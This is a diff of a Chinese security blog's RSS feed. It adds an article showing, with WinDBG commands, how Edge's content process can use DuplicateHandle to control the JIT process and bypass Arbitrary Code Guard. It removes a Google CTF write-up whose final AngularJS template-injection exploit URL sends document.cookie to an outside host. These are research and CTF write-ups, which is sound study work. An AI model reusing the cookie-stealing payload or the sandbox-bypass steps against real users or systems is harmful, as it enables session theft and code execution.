@@ -5,7 +5,188 @@
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
 <description>twosecurity.io</description>
 <language>zh-cn</language>
-<lastBuildDate>Sat, 30 Sep 2017 00:21:53 +0800</lastBuildDate>
+<lastBuildDate>Wed, 04 Oct 2017 14:43:04 +0800</lastBuildDate>
+<item>
+<title>利用 DuplicateHandle 绕过 Edge 代码执行保护</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-03-29859057.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;利用 DuplicateHandle 绕过 Edge 代码执行保护&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29859057&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在这篇文章中，我们将讲解如何绕过 Edge 的 ACG（Arbitrary Code Guard，代码执行保护)。该问题可以在装有Edge 40.15063.0.0 的 Windows 10 企业版（Creator Update，Version 1703, OS build 15063.413）中复现。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Edge 通过[分离 JIT（即时编译）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1299)实现 ACG。JIT同时需要映射原生代码到内容进程（Content Process）中。当 JIT 被调用时，它会暴露内容进程和JIT之间通信的 LRPC（轻量级远程过程调用）server。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;为了在调用过程中映射可执行内存，JIT需要（调用JIT的）进程的句柄。它如何得到该句柄呢？该调用进程需要在（伪）句柄中使用DuplicateHandle以将其发送给JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么问题来了。在调用DuplicateHandle时，内容进程需要拥有目标进程（此处是JIT)的句柄以及PROCESS_DUP_HANDLE权限 &lt;b&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms724251.aspx&quot;&gt;参考&lt;/a&gt;&lt;/b&gt;。然而，这也使得内容进程可以完全地控制 JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&quot;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&lt;/a&gt; 是这么描述的：&lt;/p&gt;&lt;blockquote&gt;注意！用户可以通过某些访问权限的进程可以使用它们来获取其它访问权限。假设进程A有进程B的句柄且对其有PROCESS_DUP_HANDLE权限，它就可以创建一个B的伪句柄。该句柄能对B拥有完整控制权。如果你想知道更多有关伪句柄的咨询，请参见GetCurrentProcess。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;让我们来debug一下：&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;输入以下命令，WinDBG就会开始调试 MicrosoftEdge.exe 和 MicrosoftEdgeCP.exe &lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;ps1con&quot;&gt;plmdebug.exe /enableDebug Microsoft.MicrosoftEdge_40.15063.0.0_neutral__8wekyb3d8bbwe &quot;c:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe&quot;&lt;/code&gt;&lt;p&gt;&lt;b&gt;打开microsoft-edge: &lt;a href=&quot;http://www.google.com/&quot;&gt;http://www.google.com&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这时会有两个 MicrosoftEdgeCP.exe，第一个是 JIT 进程，第二个是内容进程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;用 WinDBG 调试内容进程（在这个例子中，它的 PID 为5104）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:000&amp;gt;
+bp chakra!ThreadContext::EnsureJITThreadContext
+Bp
+expression &#39;chakra!ThreadContext::EnsureJITThreadContext&#39; could not be
+resolved, adding deferred bp
+0:000&amp;gt;
+g
+
+...
+
+Breakpoint
+0 hit
+chakra!ThreadContext::EnsureJITThreadContext:
+00007ff8`1a3079a4
+488bc4 mov rax,rsp&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在调用 DuplicateHandle 之前，我设置了额外的断点来捕捉 JIT 的句柄。注意，在真实的环境中，JIT 进程句柄会被存储在内存中，拥有内存读取权限的攻击者能够轻松获得它。即使攻击者不能直接读取句柄，其实也可以通过爆破的方式猜解出句柄（数值非常小)。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:015&amp;gt;
+bp 00007ff8`1a307a4d
+0:015&amp;gt;
+g
+Breakpoint
+1 hit
+chakra!ThreadContext::EnsureJITThreadContext+0xa9:
+00007ff8`1a307a4d
+ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
+(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
+(00007ff8`34408de0)}
+0:015&amp;gt;
+r
+rax=ffffffffffffffff
+rbx=ffffffffffffffff rcx=ffffffffffffffff
+rdx=ffffffffffffffff
+rsi=0000000000000000 rdi=0000000000000960
+rip=00007ff81a307a4d
+rsp=000000d2717fb9f0 rbp=000000d2717fba99
+r8=0000000000000960 r9=000000d2717fba48 r10=00000fff034a85c4
+r11=4444455511111111
+r12=00000000000004bf r13=0000000000001210
+r14=00000251fcb2aa80
+r15=00000251fcb2af48&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;JIT 句柄现在被保存到了 r8，当前的值为 0x960。我们继续运行，看看结果。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:015&amp;gt;
+g
+
+...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;进程执行一段时间后，我们再次中断并看看句柄是否还在正常运作&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;(13f0.16f0):
+Break instruction exception - code 80000003 (first chance)
+ntdll!DbgBreakPoint:
+00007ff8`37d58d70
+cc int 3&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;让我们再次调用 DuplicateHandle，但这次要额外设置参数到寄存器/栈中。如下的操作相当于调用 DuplicateHandle(jit_server_handle, GetCurrentProcess(), GetCurrentProcess(), pointer_for_storing_return_value, 0,0, DUPLICATE_SAME_ACCESS)：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
+r
+rax=ffffffffffffffff
+rbx=ffffffffffffffff rcx=0000000000000960
+rdx=ffffffffffffffff
+rsi=0000000000000000 rdi=0000000000000000
+rip=00007ff81a307a4d
+rsp=000000d2731ffb28 rbp=0000000000000000
+r8=ffffffffffffffff r9=000000d2731ffc28 r10=00000fff06fb0a64
+r11=0222001000880020
+r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000
+r15=0000000000000000
+iopl=0 nv up ei ng nz na po nc
+cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000286
+chakra!ThreadContext::EnsureJITThreadContext+0xa9:
+00007ff8`1a307a4d
+ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
+(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
+(00007ff8`34408de0)}
+0:039&amp;gt;
+p
+chakra!ThreadContext::EnsureJITThreadContext+0xaf:
+00007ff8`1a307a53
+85c0 test eax,eax
+0:039&amp;gt;
+r
+rax=0000000000000001
+rbx=ffffffffffffffff rcx=00007ff837d55b34
+rdx=0000000000000000
+rsi=0000000000000000 rdi=0000000000000000
+rip=00007ff81a307a53
+rsp=000000d2731ffb28 rbp=0000000000000000
+r8=000000d2731ffad0 r9=0000000000000000 r10=0000000000000000
+r11=0000000000000246
+r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000
+r15=0000000000000000
+iopl=0 nv up ei pl nz ac pe nc
+cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
+chakra!ThreadContext::EnsureJITThreadContext+0xaf:
+00007ff8`1a307a53
+85c0 test eax,eax&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这次的调用成功了（ DuplicateHandle 返回1)如果你再看看指向第四个参数的内存，你能得到返回的句柄(0xef4)。有了这样的权限，内容进程可以轻易地控制JIT。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
+r rcx=ef4
+0:039&amp;gt;
+r rip=kernelbase!getprocessid
+
+...
+
+0:039&amp;gt;
+r
+rax=00000000000010cc
+rbx=ffffffffffffffff rcx=00007ff837d556d4
+rdx=0000000000000000
+rsi=0000000000000000 rdi=0000000000000000
+rip=00007ff834459a35
+rsp=000000d2731ffac0 rbp=0000000000000000
+r8=000000d2731ffab8 r9=0000000000000000 r10=0000000000000000
+r11=0000000000000246
+r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000
+r15=0000000000000000
+iopl=0 nv up ei pl zr na po nc
+cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
+KERNELBASE!GetProcessId+0x25:
+00007ff8`34459a35
+4883c468 add rsp,68h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;GetProcessId 返回了0x10cc（相当于4300），刚好和 JIT 的 PID 对应。让我们试试给 JIT分配内存，不要忘了设置第五个参数（0x4）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
+r rcx=ef4
+0:039&amp;gt;
+r rdx=0
+0:039&amp;gt;
+r r8=1000
+0:039&amp;gt;
+r r9=3000
+0:039&amp;gt;
+r rip=kernelbase!virtualallocex
+
+...
+
+0:039&amp;gt;
+r
+rax=000001b929730000
+rbx=ffffffffffffffff rcx=00007ff837d556b4
+rdx=0000000000000000
+rsi=0000000000000000 rdi=0000000000000000
+rip=00007ff8343fff16
+rsp=000000d2731ffa88 rbp=0000000000000000
+r8=000000d2731ffa40 r9=0000000000000000 r10=0000000000000000
+r11=0000000000000246
+r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000
+r15=0000000000000000
+iopl=0 nv up ei pl nz ac pe nc
+cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
+KERNELBASE!VirtualAllocEx+0x16:
+00007ff8`343fff16
+4883c438 add rsp,38h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功了！我们现在能在&lt;br&gt;0x1b929730000中给 JIT 分配内存。最后，让我们看看我们是否能在 JIT中写内存。 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
+r rcx=ef4
+0:039&amp;gt;
+r rdx=000001b929730000
+0:039&amp;gt;
+r r8=000000d2`731ffce0
+0:039&amp;gt;
+r r9=10
+0:039&amp;gt;
+r rip=kernelbase!writeprocessmemory
+
+...
+
+0:039&amp;gt;
+r
+rax=0000000000000001
+rbx=ffffffffffffffff rcx=0000000000000000
+rdx=000000d2731fff00
+rsi=0000000000000000 rdi=0000000000000000
+rip=00007ff834469af9
+rsp=000000d2731ffa88 rbp=0000000000000000
+r8=000000d2731ff9e8 r9=000000d2731ffa70 r10=0000000000000000
+r11=000000d2731ffa70
+r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000
+r15=0000000000000000
+iopl=0 nv up ei pl zr na po nc
+cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
+KERNELBASE!WriteProcessMemory+0xb9:
+00007ff8`34469af9
+c3 ret&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再一次！如下截图，现在我们成功地将十六字节的数据写入到了该地址中。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ef1fc2803d8c1600f7f33e3179e1562d_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1330&quot; data-rawheight=&quot;801&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-10-03-29859057</guid>
+<pubDate>Tue, 03 Oct 2017 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>如何利用/防御 Service Worker</title>
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-29-29734820.htm</link>
@@ -614,50 +795,6 @@ Content-Type: `text/html`
 <author>Twosecurity</author>
 <guid isPermaLink="false">2017-08-22-28688437</guid>
 <pubDate>Tue, 22 Aug 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Google CTF - Back to the past</title>
-<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-19-28630038.htm</link>
-<description>&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;Google CTF - Back to the past&lt;/title&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28630038&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;题目地址：&lt;b&gt;&lt;a href=&quot;https://b2p.web.ctfcompetition.com/&quot;&gt;https://b2p.web.ctfcompetition.com/&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 Web 页面用了 AngularJS 1.5.8 作为前端框架，源代码大概如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;function getWaybackUrl() {
-  return &#39;https://web.archive.org/web/&#39; + $scope.date_y + $scope.date_m + $scope.date_d + &#39;/&#39; + $scope.website;
-};
-...
-var q = $location.search();
-if (q[&#39;url&#39;]) $scope.website = q[&#39;url&#39;];
-if (q[&#39;d&#39;]) $scope.date_d = q[&#39;d&#39;];
-if (q[&#39;m&#39;]) $scope.date_m = q[&#39;m&#39;];
-if (q[&#39;y&#39;]) $scope.date_y = q[&#39;y&#39;];
-if (q[&#39;reported&#39;]) {
-  $location.search(&#39;reported&#39;, null);
-  $window.location = getWaybackUrl();
-}
-$scope.date = [$scope.date_d, $scope.date_m, $scope.date_y].join(&#39;/&#39;);
-$scope.setDate = () =&amp;gt; $scope.date = prompt(&quot;When do you want to go?&quot;, $scope.date) || $scope.date;
-...
-  .directive(&#39;wayback&#39;, function() {
-  return {
-      template: &#39;&amp;lt;iframe class=&quot;wayback-iframe&quot; ng-src=&quot;{{getWaybackUrl()}}&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;,
-  };
-})
-
-&lt;/code&gt;&lt;p&gt;这道题让我们访问一个页面，该页面的表单会提取当前的URL以及日期(年、月、日)，再把我们重定向到 webarchive.org。&lt;/p&gt;&lt;p&gt;Krzysztof Kotowicz 指出过&lt;a href=&quot;https://www.youtube.com/watch?v=ueEsOnHJZ80&amp;amp;feature=youtu.be&amp;amp;t=21m49s&quot;&gt;该类代码的问题&lt;/a&gt;。根据他的思路，我们在此处可以尝试模板注入。然后我们需要考虑绕过 Angular 沙箱的问题，幸运的是，&lt;a href=&quot;http://blog.portswigger.net/2017/05/dom-based-angularjs-sandbox-escapes.html&quot;&gt;Portswigger&lt;/a&gt; 以及 &lt;a href=&quot;https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3&quot;&gt;mccabe615&lt;/a&gt; 已经提出来许多 bypass 思路，我们直接用他们的方法就好了。现在，我们需要想个法子来将history.back(-1)&lt;i&gt;（译者注：当我们传递一个域名给该页面时，它会跳转到该主机的archve.org的备份页，虽然我们有模板注入了，但还是要先从archive.org退回到back&lt;br&gt;to past比赛题的页面）&lt;/i&gt;注入到代码。&lt;br&gt;来写个 PoC 试试吧:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=http://google.com/%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,ale
-rt(1),a%27)%7D%7D&amp;amp;reported=1
-&lt;/code&gt;&lt;p&gt;当我们点击了 &lt;i&gt;back&lt;/i&gt; 按钮时，Chrome 竟然弹窗了!&lt;br&gt;现在，我们要编写 exp 了。我们先来看看跳转到webarchive的URL：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://web.archive.org/web/XYZ/http://domain.com/&lt;/code&gt;&lt;p&gt;其中，XYZ=日、月、年&lt;/p&gt;&lt;p&gt;webarchive 只会显示站点的历史缓存，我们如何让它主动获取当前站点的内容，并执行history.back(-1)呢？我们先用目录穿越来强制webarchive获取站点的当时状态：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=../../../save/http:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,alert(1),a%27)%7D%7D&amp;amp;reported=1&lt;/code&gt;&lt;p&gt;访问以上 URL 会被跳转到: &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://web.archive.org/save/http://our-domain.com/&lt;/code&gt;&lt;p&gt;这是我控制的一个页面，代码大概如下：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;html&amp;gt;
-&amp;lt;body&amp;gt;
-test
-&amp;lt;script src=&quot;/redirect.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;p&gt;注意，这个 redirect.js 不是内联的！这是它的代码：&lt;br&gt;history.back(-1)&lt;/p&gt;&lt;p&gt;现在我们翻翻服务器 log。因为 webarchive 需要更新内容，所以会有如下请求：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;207.241.225.236 - - [18/Jun/2017:00:35:47 +0000] &quot;GET / HTTP/1.1&quot; 200 4587 &quot;http://b2p.web.ctfcompetition.com/?url=..%2F..%2F..%2Fsave%2Fhttp:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,alert(1)%7D%7D&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/59.0.3071.104 Safari/537.36&quot;
-207.241.226.232 - - [18/Jun/2017:00:35:48 +0000] &quot;GET /redirect.js HTTP/1.1&quot; 200 18 &quot;http://our-domain.com/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/59.0.3071.104 Safari/537.36&quot;
-&lt;/code&gt;&lt;p&gt;这样，我们就能理所当然地推导出最终Exp：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://b2p.web.ctfcompetition.com/?url=../../../../../save/http:%2F%2Four-domain.com%2F&amp;amp;d=1&amp;amp;m=01&amp;amp;y=%7B%7Ba%3DtoString().constructor.prototype;a.charAt%3Da.trim;$eval(%27a,window.location=%22http://kyprizel.net/x%22%2bdocument.cookie,a%27)%7D%7D&amp;amp;reported=1
-&lt;/code&gt;&lt;p&gt;最后，我们得到了flag： &lt;i&gt;CTF{BY0uWeNtBacK2tHeDOM}&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
-<author>Twosecurity</author>
-<guid isPermaLink="false">2017-08-19-28630038</guid>
-<pubDate>Sat, 19 Aug 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
